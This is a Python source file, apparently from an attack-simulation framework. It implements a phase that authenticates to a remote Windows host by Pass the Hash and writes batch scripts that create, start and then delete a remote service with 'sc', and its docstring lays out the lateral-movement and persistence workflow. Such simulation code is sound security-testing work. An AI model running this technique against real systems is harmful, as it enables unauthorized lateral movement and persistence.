from ai_utils.phases.abstract_phase import AbstractPhaseClass
from ai_utils.utils.offensive.pass_the_hash import PassTheHashUtilsClass
from ai_utils.scenarios.globals import FileUtils, PathUtils
import logging
import re
try:
    import aipythonlib
except Exception as e:
    logging.error('Error importing aipythonlib: {0}'.format(e))

class CreateRemoteServicePhaseClass(AbstractPhaseClass):
    """This phase creates a service in the remote machine using the credentials and the binary path provided as
    parameters.

    In order to authenticate to the remote machine, Pass the Hash technique is used.
    Using this approach, this phase can be used to move laterally to another network machine and establish persistence
    once one machine has been compromised. The approach that an attacker would take is to dump all the passwords
    available in the compromised machine, being them clear text passwords, NTLM hashes, Kerberos tickets, etc and try
    each of them in order to gain access to another machine in the network. The next step would be to move files to the
    new machine in order to gather more information about the system and finally a service would be created to execute
    malicious code. This phase mimics this last step.

      Args:
         isPhaseCritical (bool):  If the phase is critical.
         targetMachine (str):  The IP of the machine in which the service will be created.
         credentialObject (dict):  Dictionary containing keys 'domain', 'user' and 'password'. All values being strings
                                   and password being a NTLM hash.
         serviceBinPath (str):  The path in the remote machine in which the binary required by the service is stored.
                                e.g. c:\windows\notepad.exe

      Kwargs:
         serviceName (str): The name of the remote service. Default: AttackIQ Attack Scenario Service
         deleteService (bool): Defines if the service has to be deleted after being created and started. Default: True
         timeout (int):  The number of milliseconds that the copy operation has in order to succeed. Default: 60000

      Returns:
         bool.  True if phase has been successful, False otherwise.
    """
    TrackerId = "516"
    Subject = "Create Remote Service"
    Description = "This phase create a service in a remote machine"

    def __init__(self, isPhaseCritical, targetMachine, credentialObject, serviceBinpath,
                 serviceName='AttackIQ Attack Scenario Service', deleteService=True, deleteServiceBinary=True,
                 timeout=90000):
        AbstractPhaseClass.__init__(self, isPhaseCritical)
        logging.info(Messages.INFO12)
        self.TargetMachine = self._SetupTargetMachine(targetMachine)
        self.Domain = self._SetupDomain(credentialObject)
        self.Username = self._SetupUser(credentialObject)
        self.PasswordHash = self._SetupPassword(credentialObject)
        self.ServiceBinPath = self._SetupServiceBinPath(serviceBinpath)
        self.ServiceName = self._SetupServiceName(serviceName)
        self.DeleteService = self._SetupDeleteService(deleteService)
        self.DeleteServiceBinary = self._SetupDeleteServiceBinary(deleteServiceBinary)
        self.Timeout = self._SetupTimeout(timeout)
        self.TestSuccessPattern = self._SetupTestSuccessPattern()
        self.CommandOutputLogPath = self._SetupCommandOutputLog()
        self.CommandScript = self._SetupCommandScript()
        self.CommandOutput = ''

    def Setup(self):
        if not self.TargetMachine:
            self.PhaseReporter.Error(Messages.ERROR1)
            return False
        if not self.Domain:
            self.PhaseReporter.Error(Messages.ERROR2)
            return False
        if not self.Username:
            self.PhaseReporter.Error(Messages.ERROR3)
            return False
        if not self.PasswordHash:
            self.PhaseReporter.Error(Messages.ERROR4)
            return False
        if not self.ServiceBinPath:
            self.PhaseReporter.Error(Messages.ERROR5)
            return False
        if not self.CommandScript:
            self.PhaseReporter.Error(Messages.ERROR7)
            return False
        if not self.CommandOutputLogPath:
            self.PhaseReporter.Error(Messages.ERROR8)
            return False
        return True

    def Cleanup(self):
        if not self.RemoveOutputLog():
            self.PhaseReporter.Warn(Messages.WARN1.format(self.CommandOutputLogPath))
        if not self.RemoveScript():
            self.PhaseReporter.Warn(Messages.WARN2.format(self.CommandScript))
        if self.DeleteService:
            if self.DeleteRemoteService():
                self.PhaseReporter.Info(Messages.INFO19)
            else:
                self.PhaseReporter.Warn(Messages.WARN3.format(self.TargetMachine))
        return True

    def RemoveOutputLog(self):
        return FileUtils.DeleteFile(self.CommandOutputLogPath)

    def RemoveScript(self):
        return FileUtils.DeleteFile(self.CommandScript)

    def DeleteRemoteService(self):
        self.CommandOutputLogPath = self._SetupCommandOutputLog()
        self.CommandScript = self._SetupCommandScript(forServiceDeletion=True)
        success = self._RemoveRemoteService()  # script contents are changed so it will only remove the service
        if not self.RemoveOutputLog():
            self.PhaseReporter.Warn(Messages.WARN1.format(self.CommandOutputLogPath))
        if not self.RemoveScript():
            self.PhaseReporter.Warn(Messages.WARN2.format(self.CommandScript))
        return success

    def Run(self):
        phaseSuccessful = self._CreateRemoteService()
        self._LogSuccess(phaseSuccessful)
        return phaseSuccessful

    ###
    # Internal methods
    ##################

    def _CreateRemoteService(self):
        self.PhaseReporter.Info(Messages.INFO13)
        success = False
        if PassTheHashUtilsClass.Execute(self.Domain, self.Username, self.PasswordHash, self.CommandScript, self.Timeout):
            success = self._CheckCommandOutput()
        return success

    def _RemoveRemoteService(self):
        self.PhaseReporter.Info(Messages.INFO18)
        success = False
        if PassTheHashUtilsClass.Execute(self.Domain, self.Username, self.PasswordHash, self.CommandScript, self.Timeout):
            success = self._CheckCommandOutput()
        return success

    def _CheckCommandOutput(self):
        self.PhaseReporter.Info(Messages.INFO14)
        success = False
        if self._ReadCommandOutputFile():
            success = self._CheckIfCommandOutputIsCorrect()
        return success

    def _ReadCommandOutputFile(self):
        success = False
        if FileUtils.FileExists(self.CommandOutputLogPath):
            success = True
            self.CommandOutput = FileUtils.ReadFromFile(self.CommandOutputLogPath)
        else:
            logging.error(Messages.ERROR9)
        return success

    def _CheckIfCommandOutputIsCorrect(self):
        success = False
        pattern = re.compile(self.TestSuccessPattern)
        if pattern.search(self.CommandOutput):
            success = True
        else:
            logging.error(Messages.ERROR10)
            self.PhaseReporter.Info(Messages.ERROR11.format(self.CommandOutput))
        return success

    def _LogSuccess(self, phaseSuccessful):
        if phaseSuccessful:
            self.PhaseReporter.Info(Messages.INFO15)
            self.PhaseReporter.Report('A script was executed remotely using Pass the Hash. The script created a service using the "sc" Windows tool.')
        else:
            self.PhaseReporter.Info(Messages.INFO16)

    ###
    # Parameter setup
    ##################

    def _SetupTargetMachine(self, targetMachine):
        param = str(targetMachine)
        if param:
            self.PhaseReporter.Info(Messages.INFO1.format(param))
        return param

    def _SetupDomain(self, credentialObject):
        param = str(credentialObject.get('domain', ''))
        if param:
            self.PhaseReporter.Info(Messages.INFO2.format(param))
        return param

    def _SetupUser(self, credentialObject):
        param = str(credentialObject.get('user', ''))
        if param:
            self.PhaseReporter.Info(Messages.INFO3.format(param))
        return param

    def _SetupPassword(self, credentialObject):
        param = str(credentialObject.get('password', ''))
        if param:
            self.PhaseReporter.Info(Messages.INFO11.format(param[:3] + '(redacted)'))
        return param

    def _SetupTimeout(self, timeout):
        param = timeout
        if param:
            self.PhaseReporter.Info(Messages.INFO4.format(param))
        return param

    def _SetupCommandScript(self, forServiceDeletion=False):
        param = PathUtils.GetTempFile(prefixArg='ai-cmd-', suffixArg='.bat')
        if forServiceDeletion:
            command = self._GetBatchScriptContentsForServiceDeletion()
        else:
            command = self._GetBatchScriptContentsForServiceCreation()
        with open(param, 'w') as fd:
            fd.write(command)
        logging.info(Messages.INFO5.format(param))
        logging.info(Messages.INFO6.format(command))
        return param

    def _GetBatchScriptContentsForServiceCreation(self):
        return r"""
        setlocal enabledelayedexpansion

        >{1} 2>&1 (
          echo "Connecting to {0} IPC$ share"
          net use "\\{0}\ipc$"
          echo "Creating and starting remote process"
          sc \\{0} create "{3}" binPath= "{2}"
          sc \\{0} start "{3}" "{3}" "{4}"
          echo "Checking if remote service is running in target machine"
          sc \\{0} query "{3}" | findstr /c:"RUNNING"
          if not ERRORLEVEL 1 echo Pass the Hash Successful (starting service)
          echo "Disconnecting IPC$"
          net use /delete "\\{0}\ipc$"
        )

        exit /b 0
        """.format(self.TargetMachine, self.CommandOutputLogPath, self.ServiceBinPath, self.ServiceName, self.DeleteServiceBinary)

    def _GetBatchScriptContentsForServiceDeletion(self):
        return r"""
        setlocal enabledelayedexpansion

        >{1} 2>&1 (
          echo "Connecting to {0} IPC$ share"
          net use "\\{0}\ipc$"
          echo "Creating remote process"
          sc \\{0} stop "{3}"
          sc \\{0} delete "{3}"
          if not ERRORLEVEL 1 echo Remote service correctly removed
          echo "Removing service binary image"
          if True == {5} del "\\{0}\{4}"
          if not ERRORLEVEL 1 echo Pass the Hash Successful (removing service and binary)
          echo "Disconnecting IPC$"
          net use /delete "\\{0}\ipc$"
        )

        exit /b 0
        """.format(self.TargetMachine, self.CommandOutputLogPath, self.ServiceBinPath, self.ServiceName,
                   self.ServiceBinPath.replace(':', '$'), self.DeleteServiceBinary)

    def _SetupCommandOutputLog(self):
        param = PathUtils.GetTempFile(prefixArg='ai-cmd-log-', suffixArg='.log')
        if param:
            logging.info(Messages.INFO7.format(param))
        return param

    def _SetupTestSuccessPattern(self):
        param = 'Pass the Hash Successful'
        logging.info(Messages.INFO8.format(param))
        return param

    def _SetupServiceBinPath(self, serviceBinPath):
        param = str(serviceBinPath)
        if param:
            logging.info(Messages.INFO9.format(param))
        return param

    def _SetupServiceName(self, serviceName):
        param = str(serviceName)
        if param:
            logging.info(Messages.INFO17.format(param))
        return param

    def _SetupDeleteService(self, deleteService):
        param = deleteService
        if param:
            logging.info(Messages.INFO9.format(param))
        return param

    def _SetupDeleteServiceBinary(self, deleteServiceBinary):
        param = deleteServiceBinary
        if param:
            logging.info(Messages.INFO20.format(param))
        return param

class Messages(object):
    INFO1 = 'Target Machine passed as parameter: {0}'
    INFO2 = 'Domain passed as parameter: {0}'
    INFO3 = 'Username passed as parameter: {0}'
    INFO4 = 'Timeout parameter set to: {0}'
    INFO5 = 'Script to be executed: {0}'
    INFO6 = 'Script contents: {0}'
    INFO7 = 'Log filename used to retrieve script execution output: {0}'
    INFO8 = 'Success Pattern value used to check if script execution is successful: {0}'
    INFO9 = 'Service Binary Path passed as parameter: {0}'
    INFO10 = 'Delete Service passed as parameter: {0}'
    INFO11 = 'Password passed as parameter: {0}'
    INFO12 = 'Executing Create Remote Service phase...'
    INFO13 = 'Creating remote service using provided credentials...'
    INFO14 = 'Checking if command was successful...'
    INFO15 = 'Remote service was successfully created'
    INFO16 = 'Failed to create remote service'
    INFO17 = 'Service Name passed as parameter: {0}'
    INFO18 = 'Removing remote service using provided credentials...'
    INFO19 = 'Remote service was successfully removed'
    INFO20 = 'Delete service binary parameter set to {0}'

    WARN1 = 'Command Output Log filename could not be removed. You might want to manually remove it: {0}'
    WARN2 = 'Script filename could not be removed. You might want to manually remove it: {0}'
    WARN3 = 'Remote service and binary in {0} could not be deleted. You might want to manually delete it.'

    ERROR1 = 'Target Machine is required.'
    ERROR2 = 'Domain parameter is required.'
    ERROR3 = 'Username parameter is required.'
    ERROR4 = 'Password parameter is required.'
    ERROR5 = 'Service Binary Path could not be setup. Phase can not continue.'
    ERROR7 = 'Command Script could not be setup. Phase can not continue.'
    ERROR8 = 'Command Output Log Path could not be setup. Phase can not continue.'
    ERROR9 = 'Command output file has not been created. This means that the command has failed.'
    ERROR10 = 'Test Success Pattern could not be found in command output file. Remote command has failed.'
    ERROR11 = 'Command has failed. The output of the command is: {0}'
